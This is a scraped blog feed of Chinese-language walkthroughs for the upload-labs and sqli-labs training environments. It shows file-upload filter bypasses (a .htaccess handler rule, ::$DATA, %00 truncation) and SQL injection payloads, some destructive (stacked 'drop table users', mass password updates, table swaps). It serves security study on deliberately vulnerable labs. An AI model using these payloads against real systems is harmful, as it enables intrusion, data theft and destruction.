checkFile()&quot;&gt;</span><br></pre></td></tr></table></figure>onsubmit&#x3D;&quot;return checkFile()&quot;改为onsubmit&#x3D;&quot;return true&quot;</li></ul><h2 id="pass-2"><a href="#pass-2" class="headerlink" title="pass-2"></a>pass-2</h2><p>后台检测Content Type，抓包修改<br><img src="/images/%E5%AD%A6/upload-labs/pass-2.1.png" alt="试试图片" loading="lazy"></p><h2 id="pass-3"><a href="#pass-3" class="headerlink" title="pass-3"></a>pass-3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="comment">//删除文件名末尾的点  3.php. . -&gt;  3.php.</span></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);</span><br><span class="line"><span class="comment">//返回最后出现的.以及之后所有字符  3.php. -&gt; .</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="comment">//转换为小写 . -&gt; .</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>);   </span><br><span class="line"><span class="comment">//去除字符串::$DATA  .</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);</span><br><span class="line"><span class="comment">//收尾去空 .</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>);</span><br><span class="line">过滤<span class="variable">$file_ext</span></span><br><span class="line">生成随即文件名，拼接<span class="variable">$file_ext</span></span><br></pre></td></tr></table></figure><p>文件名被丢弃，后缀只能来自$file_ext，$file_ext全为小写，且不能是.php</p><p>如果http.conf中设置了php3,phtml等后缀名为php解析,且黑名单未过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .php3 .phtml</span><br></pre></td></tr></table></figure><p>则上传3.php3,打开图像链接成功回显</p><h2 id="pass-4"><a href="#pass-4" class="headerlink" title="pass-4"></a>pass-4</h2><p>和第三关比，过滤了，但文件名不会被改变,</p><ul><li><p>windows环境<br>可以用04.php. .绕过,经过滤<br>后缀名为.<br>文件名为04.php<br>win去除04.php.最后的点。</p></li><li><p>apach 配置允许使用.htaccess<br>httpd.conf里设置如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> &quot;<span class="attr">C:</span>\<span class="attr">Users</span>\<span class="attr">Administrator</span>\<span class="attr">Desktop</span>\<span class="attr">upload-labs-env</span>\<span class="attr">WWW</span>&quot;&gt;</span></span><br><span class="line">Options Indexes FollowSymLinks</span><br><span class="line">AllowOverride All</span><br><span class="line">Order allow,deny</span><br><span class="line">Allow from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure><p><em>需要设置AllowOverride All .htaccess才能生效</em></p></li><li><p>上传.htaccess,(必须是.htaccess没有文件名)内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;11.gif&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li><li><p>.htaccess的同级文件和子目录下的11.gif将视为php解析</p></li><li><p>上传并访问11.gif成功回显</p></li></ul><h2 id="pass-5"><a href="#pass-5" class="headerlink" title="pass-5"></a>pass-5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"> <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点1.php. .</span></span><br><span class="line"> <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">////返回最后的.及后续字符  这一步保证file_ext有且只有一个点</span></span><br><span class="line"> <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA </span></span><br><span class="line"> <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空 </span></span><br><span class="line"> 随机文件名.ext</span><br></pre></td></tr></table></figure><p>发现并未转小写 上传05.phP 成功回显</p><h2 id="pass-6"><a href="#pass-6" class="headerlink" title="pass-6"></a>pass-6</h2><p>没有收尾去空,上传06.php      绕过</p><h2 id="pass-7"><a href="#pass-7" class="headerlink" title="pass-7"></a>pass-7</h2><p>和pass-4一样,没有改变文件名.而且没有去除后面的点<br>上传07.php. .  或07php.</p><h2 id="pass-8"><a href="#pass-8" class="headerlink" title="pass-8"></a>pass-8</h2><p>和pass-3范例相比,没有去除::$DATA,Windows会自动去掉末尾的::$DATA<br>上传08.php::$DATA</p><h2 id="pass-9"><a href="#pass-9" class="headerlink" title="pass-9"></a>pass-9</h2><p>和pass-4一样,没有改变文件名,<br>上传09.php. .</p><h2 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h2><p>匹配黑名单并替换为空<br>10.phjspp  </p><h2 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>...&#125;</span><br></pre></td></tr></table></figure><p>白名单,随机文件名,上传路径未过滤<br>上传11.jpg, 抓包post请求，参数改为 save_path&#x3D;..&#x2F;upload&#x2F;11.php%00<br>%00截断路径，&#x2F;upload&#x2F;11.php%00&#x2F;随机文件名.jpg<br>最终上传11.php</p><h2 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h2><p>pass11的post版，抓包更改路径<br>选中%00，ctrl+shift+u解码为url</p><h2 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h2><p>通过头两个字节判断文件类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">J<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;111&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>被识别成jpg<br>访问include.php?file&#x3D;upload&#x2F;&#x2F;1520250207231907.jpg</p><h2 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h2><p>getimagesize()检查图片宽高，模拟图片hex到宽高的位置，或将木马放入一个真的图片中上传</p>]]></content>
      
      
      <categories>
          
          <category> upload </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less-38到53</title>
      <link href="/2024/12/04/%E5%AD%A6/sqli-labs/sqli-labs-less-35-45/"/>
      <url>/2024/12/04/%E5%AD%A6/sqli-labs/sqli-labs-less-35-45/</url>
      
        <content type="html"><![CDATA[<h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>堆叠注入 ,这关用的是mysqli_multi_query($con1, $sql)函数，以前都用mysql_query($sql);</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$con1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_more_results</span>(<span class="variable">$con1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;-----------------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用分号分隔语句，服务器会依次执行。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3;&#x27;</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> users;</span><br><span class="line"><span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="less-39-41"><a href="#less-39-41" class="headerlink" title="less-39_41"></a>less-39_41</h3><ul><li>39：数字注入，同上</li><li>40：&#39;)闭合</li><li>41: 不回显的堆叠注入</li></ul><h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><p>passwd没有过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usrname:随便</span><br><span class="line">passwd: <span class="number">1</span><span class="string">&#x27;;UPDATE users SET password =&#x27;</span><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">UPDATE users SET username=&#x27;</span><span class="number">1</span><span class="string">&#x27;;#</span></span><br></pre></td></tr></table></figure><h3 id="less43-45"><a href="#less43-45" class="headerlink" title="less43_45"></a>less43_45</h3><ul><li>43 <code>&#39;);create table less43 like users#</code></li><li>44 无报错回显的42</li><li>45 无报错回显的43</li></ul><h2 id="less-46-ORDER-BY后"><a href="#less-46-ORDER-BY后" class="headerlink" title="less-46 ORDER BY后"></a>less-46 ORDER BY后</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>ORDER BY类似给每行加序号<br>ORDER BY 1 指使用第一列(id)作为每行的序号<br>ORDER by &#39;1&#39; 每行序号都是&#39;1&#39;没有区别，所以使用默认排序<br>ORDER BY if(id&#x3D;10,0,1) 仅当id&#x3D;10时序号为0，其他行都为1，所以id&#x3D;10在最前面</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--[前面条件]为真时，仅有id=10的序号置为0，其他序号置1;条件为假，序号全为1</span></span><br><span class="line"><span class="comment">--当10在最前面，则注入条件为真</span></span><br><span class="line">If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">116</span> <span class="keyword">and</span> id<span class="operator">=</span><span class="number">10</span>,<span class="number">0</span>,<span class="number">1</span>)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--如果不知道列名</span></span><br><span class="line"><span class="comment">--顺序则真，乱序则假，rand(1)似乎是伪随机，每次生成的顺序都一样</span></span><br><span class="line">If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">116</span>,<span class="number">1</span>,rand(<span class="number">1</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>其他注入方式<a href="https://www.cnblogs.com/lcamry/p/5762710.html">参考</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--布尔，order by rand(true|false)rand生成固定的乱序，</span></span><br><span class="line">rand((ascii(<span class="keyword">right</span>(database(),<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">114</span>))<span class="comment">--+</span></span><br><span class="line">If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span>,password,username)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--时间 每一条都sleep0.2秒，一共2.6秒</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span>,<span class="number">0</span>,sleep(<span class="number">0.2</span>))<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--报错</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(database()),(version())),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h3><p>ORDER BY 字段1 DESC, 字段2 ASC;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>ORDER BY &#39;username&#39;</code><br>变量被引号爆了，输入什么都是默认排序</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 已知列名</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; DESC,If(ascii(substr(database(),1,1))&gt;116 and id=10,0,1) DESC--+&#x27;</span></span><br><span class="line"><span class="comment">-- </span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">&#x27;$id&#x27;</span>,If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">116</span>,<span class="number">1</span>,rand(<span class="number">1</span>))<span class="comment">--+</span></span><br><span class="line"><span class="comment">-- 真和假都是乱序，但顺序不同，且固定</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; DESC,If(ascii(substr(database(),1,1))&lt;116,1,rand(1)) DESC--+</span></span><br></pre></td></tr></table></figure><p>不知道什么原理</p><h3 id="less-48-49"><a href="#less-48-49" class="headerlink" title="less-48_49"></a>less-48_49</h3><p>48同46,49同47,只是报错注入都不能用</p><h2 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h2><p>oderby 的堆叠注入<br>用46的方法拿到表名 </p><ul><li><code>CREATE TABLE new_table LIKE original_table;</code>  复制表结构    </li><li><code>CREATE TABLE new_table SELECT * FROM original_table;</code>复制表结构和数据</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*改名前要锁起来*/</span></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> temp <span class="keyword">SELECT</span> table_name,table_schema,<span class="number">1</span> <span class="keyword">from</span> information_schema.tables  <span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns;</span><br><span class="line">lock tables users write;</span><br><span class="line"><span class="keyword">alter table</span> users rename <span class="keyword">to</span> usersbak;</span><br><span class="line">lock tables temp write;</span><br><span class="line"><span class="keyword">alter table</span> temp rename <span class="keyword">to</span> users;</span><br><span class="line">unlock tables;<span class="comment">--+</span></span><br><span class="line"><span class="comment">--查看</span></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> </span><br><span class="line"><span class="comment">-- 换回来</span></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span>;<span class="keyword">drop</span> <span class="keyword">table</span> users;</span><br><span class="line">lock tables usersbak write;</span><br><span class="line"><span class="keyword">alter table</span> usersbak rename <span class="keyword">to</span> users;</span><br><span class="line">unlock tables;<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="less-51-53"><a href="#less-51-53" class="headerlink" title="less-51_53"></a>less-51_53</h3><ul><li>51:用47的方法拿到表名，50的方法堆叠注入<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">CREATE TABLE temp ...</span></span><br><span class="line"><span class="string">unlock tables;--+&#x27;</span></span><br></pre></td></tr></table></figure></li><li>52不回显报错的50</li><li>53不回显报错的51</li></ul><hr><hr>]]></content>
      
      
      <categories>
          
          <category> sqli </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less-28到37</title>
      <link href="/2024/11/28/%E5%AD%A6/sqli-labs/sqli-labs-less-28-37/"/>
      <url>/2024/11/28/%E5%AD%A6/sqli-labs/sqli-labs-less-28-37/</url>
      
        <content type="html"><![CDATA[<h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>用%00结束语句代替注释，有攻略使用%a0代替空格 这里不行。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;);%00</span></span><br><span class="line"><span class="string">&#x27;</span>) <span class="operator">%</span><span class="number">0</span>B <span class="keyword">UniON</span> <span class="operator">%</span><span class="number">0</span>B <span class="keyword">sElect</span> <span class="operator">%</span><span class="number">0</span>B <span class="number">1</span>,<span class="number">2</span>,database();<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure><p>less-28a 同上</p><h2 id="less-29-31"><a href="#less-29-31" class="headerlink" title="less-29-31"></a>less-29-31</h2><h3 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h3><h4 id="纯php版本"><a href="#纯php版本" class="headerlink" title="纯php版本"></a>纯php版本</h4><p>网页目录下有三个文件，login.php是带白名单的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="variable">$hint</span>=<span class="variable">$qs</span>;</span><br><span class="line"><span class="variable">$id1</span>=<span class="title function_ invoke__">java_implimentation</span>(<span class="variable">$qs</span>);<span class="comment">//模拟tomcat环境</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];              <span class="comment">//模拟apache环境</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;id1：&#x27;</span>.<span class="variable">$id1</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">whitelist</span>(<span class="variable">$id1</span>);<span class="comment">//只允许数字</span></span><br></pre></td></tr></table></figure><p>这关本意是用HTTP参数污染绕过白名单，http可以get提交两个同名参数，<br>apache会获取到的最后一个参数，tomcat则获取第一个参数<br>白名单只在tomcat环境上，只检查第一个参数，第二个参数绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-29</span><span class="operator">/</span>login.php<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="string">&#x27; union select 1,version(),database()--+</span></span><br></pre></td></tr></table></figure><h4 id="jsp-php双层"><a href="#jsp-php双层" class="headerlink" title="jsp+php双层"></a>jsp+php双层</h4><p>原先的phpstudy不用关</p><ul><li>省事下载jspstudy: <a href="https://old.xp.cn/download.html">下载jsp版本</a></li><li>将sqli-lab目录下的tomcat-files.zip解压到网站根目录</li><li>其他选项-&gt;jspstudy设置-&gt;高级设置 选择不启用apache</li></ul><p>访问<a href="http://192.168.86.131:8080/%E9%80%89%E6%8B%A9sql-labs/less-29">http://192.168.86.131:8080/选择sql-labs/less-29</a><br>显示的就是jsp文件了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">rex</span> <span class="operator">=</span> <span class="string">&quot;^\\d+$&quot;</span>;</span><br><span class="line">Boolean match=id.matches(rex);</span><br><span class="line"><span class="keyword">if</span>(match == <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">URL</span> <span class="variable">sqli_labs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost/sqli-labs/Less-29/index.php?&quot;</span>+ qs);<span class="comment">//index.php没有过滤</span></span><br><span class="line">       <span class="type">URLConnection</span> <span class="variable">sqli_labs_connection</span> <span class="operator">=</span> sqli_labs.openConnection();<span class="comment">//参数传给php,php连接mysql</span></span><br><span class="line">       <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(</span><br><span class="line">                               <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(</span><br><span class="line">                               sqli_labs_connection.getInputStream()));</span><br><span class="line">       String inputLine;</span><br><span class="line">       <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="literal">null</span>) <span class="comment">//打印php服务器的res</span></span><br><span class="line">           out.print(inputLine);</span><br><span class="line">       in.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">response.sendRedirect(<span class="string">&quot;hacked.jsp&quot;</span>);</span><br></pre></td></tr></table></figure><p>同上</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-29</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="string">&#x27; union select 1,version(),database()--+</span></span><br></pre></td></tr></table></figure><h3 id="less-30"><a href="#less-30" 